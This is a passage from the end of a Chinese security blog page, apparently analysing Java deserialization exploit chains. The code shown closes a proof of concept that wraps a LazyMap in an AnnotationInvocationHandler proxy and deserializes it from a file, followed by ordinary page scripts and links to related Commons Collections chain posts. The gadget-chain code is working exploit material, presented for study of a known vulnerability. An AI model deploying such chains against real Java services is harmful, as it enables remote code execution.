class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationHadlConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationHadlConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler h = (InvocationHandler) annotationInvocationHadlConstructor.newInstance(Override.class, lazyMap);<br><br>        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,h);<br><span class="hljs-comment">//        Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[])</span><br>        Object o = annotationInvocationHadlConstructor.newInstance(Override.class,mapProxy);<br><br><span class="hljs-comment">//        serialize(o);</span><br>        unserialize();<br>    &#125;<br><br>    <span class="hljs-comment">//序列化和反序列化</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">// ObjectOutputStream 对象输出流，将Person对象存储到E盘的Person.txt文件中，完成对Person对象的序列化操作</span><br>        ObjectOutputStream oo = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;ser.bin&quot;</span>)));<br>        oo.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<br>            <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;ser.bin&quot;</span>)));<br>        Object object = (Object) ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功！&quot;</span>);<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+    </div>
+</div>
+<style>
+    #noneimg img {
+        display: none;
+        z-index: 109;
+        width: 600px !important;
+        border-radius: 0px;
+        position: fixed;
+        box-shadow: 0 0 0px #c3c3c300 !important;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto !important;
+    }
+
+    @media screen and (max-width:600px) {
+        #noneimg img {
+            width: 88%
+        }
+    }
+</style>
+<script>
+    $(function () { $('#article').click(function (e) { if (e.target.tagName == "IMG") { if ($('#nonediv').length == 0) { let MImg = `<div id='noneimg'><img src='${e.target.currentSrc}'></div>`; let MDiv = "<div id='nonediv' style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #333;opacity:0.5;z-index: 108;'></div>"; $('#article').append(MDiv); $('#article').append(MImg); $("#nonediv").fadeIn("slow"); $("#noneimg img").fadeIn("slow") } } else { if ($('#nonediv').length !== 0) { $("#noneimg ").fadeOut("slow"); $("#nonediv").fadeOut("slow"); setTimeout(function () { $('#nonediv').remove(); $('#noneimg').remove() }, 500) } } }); $('.article-content').addClass('content-move') });
+</script>
+<div class="Last-Next">
+    
+    <a href="/2022/03/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Commons%20Collections2%E3%80%814%E3%80%815%E3%80%817%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
+        <div class="last">
+            <span>上一篇</span>
+            <p>Java反序列化-Commons Collections2、4、5、7利用链分析</p>
+        </div>
+    </a>
+    
+
+    
+    <a href="/2022/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
+        <div class="next">
+            <span>下一篇</span>
+            <p>Java反序列化-Commons Collections6利用链分析</p>
+        </div>
+    </a>
+    
+</div>
+		
+<link rel="stylesheet" href="/css/food.css">
+
+<div class="footer">
+	<div class="Copyright">
+		©2022 By TRRQ. 主题：<a
+			style="text-decoration: none;display: contents; color: #898F9F;"
+			target="_blank" rel="noopener" href="https://github.com/qiaobug/hexo-theme-quiet">Quiet</a>
+	</div>
+	<div class="contact">
+		
+		<a target="_blank" rel="noopener" href="https://github.com/qiaobug">
+			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+		</a>
+		
+	</div>
+</div>
+
+<script src="/js/jquery.min.js"></script>
+
+
+<script src="/js/gotop.js"></script>
+
+
+<style type="text/css">
+    @media screen and (min-width: 600px) {
+        .goTop>span {
+            display: block;
+            border-radius: 50%;
+            width: 66px;
+            height: 66px;
+            cursor: pointer;
+            opacity: 0.8;
+            background: rgba(18, 24, 58, 0.06);
+            text-align: center;
+            border: 1px solid rgba(18, 24, 58, 0.06);
+
+            transition: border .5s;
+            -moz-transition: border .5s;
+            /* Firefox 4 */
+            -webkit-transition: border .5s;
+            /* Safari 和 Chrome */
+            -o-transition: border .5s;
+            /* Opera */
+        }
+
+        .goTop>span:hover {
+            border: 1px solid #6680B3;
+        }
+
+
+        .goTop {
+            position: fixed;
+            right: 30px;
+            bottom: 80px;
+        }
+
+        .goTop>span>svg {
+            width: 30px;
+            height: 30px;
+            margin-top: 17.5px;
+            opacity: 0.7;
+        }
+
+    }
+
+    @media screen and (max-width: 600px) {
+        .goTop {
+            display: none;
+        }
+    }
+</style>
+<div class="goTop" id="js-go_top">
+    <span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+            <g>
+                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
+            </g>
+        </svg>
+    </span>
+</div>
+<script>
+    $('#js-go_top').gotoTop({ offset: 500, speed: 300, animationShow: { 'transform': 'translate(0,0)', 'transition': 'transform .5s ease-in-out' }, animationHide: { 'transform': 'translate(100px,0)', 'transition': 'transform .5s ease-in-out' } });
+</script>
+<script>
+	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/QiaoBug/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
+</script>
+	</body>
+
+</html>
